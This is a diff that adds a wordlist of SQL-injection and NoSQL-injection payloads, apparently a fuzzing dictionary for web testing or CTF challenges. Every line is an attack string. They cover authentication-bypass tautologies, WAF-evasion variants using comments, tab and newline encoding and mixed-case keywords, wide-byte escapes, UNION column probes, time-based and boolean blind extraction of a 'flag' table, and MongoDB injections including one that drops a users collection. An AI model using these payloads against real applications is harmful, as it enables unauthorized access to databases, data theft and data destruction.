@@ -1,0 +1,193 @@
+#有参数的 id=1/**/and 999=999
+/*!order/*!by/*!26*/;
+/*!union/*!select/*!1,2,3,4*/;
+%bf%27
+%bf%27/**/or/**/1=1--+
+%bf%27/**/or/**/1=1#
+%27%bf
+%df%5c
+%27%E9%82%AE%E8%BD%AE%27)
+%27%E9%82%
+AE%E8
+%BD%AE
+%27
+%bf\
+" or "a"="a
+" or 1=1 --
+' or 1=1 --
+' or 'a'='a
+') or ('a'='a
+") or ("a"="a
+'' or 'x'='x';
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+admin';%00
+adsa'='';%00
+admin'or/**/'1'='1
+admin'/**/or/**/'1'='1
+/**/||/**/`id`
+%0a||/**/`id`
+'"{}<>#%*()!@
+ and{``1=1}
+/**/and{``1=1}
+' and{``1=1}#
+\nand 1=1
+\nand 1=2
+\nand/**/1=1
+\nand/**/1=2
+/**/and 999=999
+/**/and 87997=2
+/*^*/and 999=999
+/*^*/and 87997=2
+/**/and/**/999=999
+/**/and/**/87997=2
+%0aand%0a999=999
+%0aand%0a87997=2
+%09and%091=1
+%09AND%091=1
+%09aNd%091=1
+%09aNaNdd%091=1
+'%09And%091=1#
+'%09aNaNdd%091=1#
+' aNaNdd 1=1#
+' aNaNdd 1=2#
+' aNaNdd 1=2--+
+'%0aAAndnd%0a1=1--+
+%09and%091>2
+%09AND%091>2
+%09aNd%091>2
+%09aNaNdd%091=2
+'%09And%091=1#
+%09aNd%091=1#
+%09aNaNdd%091=1#
+%09or%091=1
+%09oR%091=1
+%09oOrr%091=1
+'%09or%091=1#
+%09or%091=1#
+%09aNord%091=1#
+%09or%091>2
+%09or%091>2
+%09or%091>2
+%09aNord%091=2
+'%09or%091=1#
+%09or%091=1#
+/**/or 999=999
+/**/or 87997=2
+/*^*/or 999=999
+/*^*/or 87997=2
+/**/or/**/999=999
+/**/or/**/87997=2
+%0aor%0a999=999
+%0aor%0a87997=2
+0e-1and%0a1=1
+0e-1and%0a1=2
+0e-1or%0a1=1
+0e-1or%0a1=2
+/*!and*/1=1
+/*!and*/1=2
+%0alike%0a1=1
+%0alike%0a2=1
+'=0#
+'=0%26name='bob'=0#
+'=0%26id=1=0#
+'=sleep(5-4)#
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4
+%0a/*!50000unIOn*//*yoyu*/all/**//*!seLEct*//*nnaa*/+1,2,3,4
+'/*!50000unIOn*//*yoyu*/all/**//*!seLEct*//*nnaa*/+1,2,3,4--+
+'<>all (select ord(substr(flag,1,1)) div(16) mod(2) from flag)#
+'<>all (select ord(substr(flag,1,1)) div 16 mod 2 from flag)#
+%09oRdEr%09bY%093
+'%09oRdEr%09bY%093#
+%0aand%0aformsec()
+'%0aand%0aformsec()#
+' and linestring(id)
+'%0aand%0alinestring(id)#
+%0aand{`version`length((select/*!50000schema_name*/from/*!50000information_schema.schemata*/limit 0,1))>0}
+#无参数的  id=sleep(3)
+'formsec()#
+formsec()
+1^1^0
+sleep(9)
+sleep(6-4)
+'>sleep(6-4)#
+'or id='2
+'or flag='0
+'or user.`desc`='
+'not in (select flag from flag)#
+'not in (select name from user)#
+'=all (select substr(flag,1,1) from flag)#
+\Nunion/**/select/**/1,2,3
+or 1=1
+or 1=2
+1.0or 1=1
+1.0%26%26 1=1
+'or flag='0
+or string(2)=string(2)
+`
+'
+\'
+\%00' select 1
+1'or'1'='1
+'1^1'
+'1^0'
+"1^1"
+"1^0"
+-23
+-1212
+"
+#
+-
+--
+|| `id`
+|| `flag`
+|| `seck`
+and `id`
+and `seck`
+||/**/`id`
+and/**/`name`
+and%0a`namne`
+[$ne]=ewe
+[$regex]=s
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+or 1=1--
+or%201=1
+or%201=1 --
+%27});return%20{username:1,password:2};
+'});return ({username:version(),password:2});var foo = ({'foo':'
+'});db.users.drop();db.user.find({'username':'2
+')>0|| this.owners.indexOf('admin
+1 WAITFOR DELAY '0:0:5'--
